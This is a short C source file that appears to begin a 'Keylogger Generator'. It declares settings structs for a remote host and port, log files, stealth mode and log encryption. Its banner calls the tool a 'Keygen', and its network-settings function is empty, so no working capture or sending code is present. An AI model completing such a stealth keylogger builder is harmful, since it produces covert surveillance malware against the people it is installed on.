/**
 * @file 0_gen.c
 * @brief 0 Keylogger Generator
 * @copyright Copyright (C) 2024 Davide Usberti
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

typedef struct
{
    char *host;
    uint32_t port;
    char *protocol;
} network_settings_t;

typedef struct
{
    bool enabled;
    char *file;
    char *format;
    char *timestamp_format;
} logging_settings_t;

typedef struct
{
    bool stealth_mode;
    bool encrypt_logs;
} security_settings_t;

typedef struct
{
    bool enabled;
    bool verbose;
} debug_settings_t;

typedef struct
{
    network_settings_t network;
    logging_settings_t logging;
    security_settings_t security;
    debug_settings_t debug;
} settings_t;

void print_banner()
{
    printf("%s", "Welcome to 0 Keygen\nPress ENTER to continue...");

    char signal[8];
    fgets(signal, sizeof(signal), stdin);
    return;
}

/**
 * Network Settings
 */
_Bool ask_net_settings() {
    
}


int main()
{
    print_banner();
}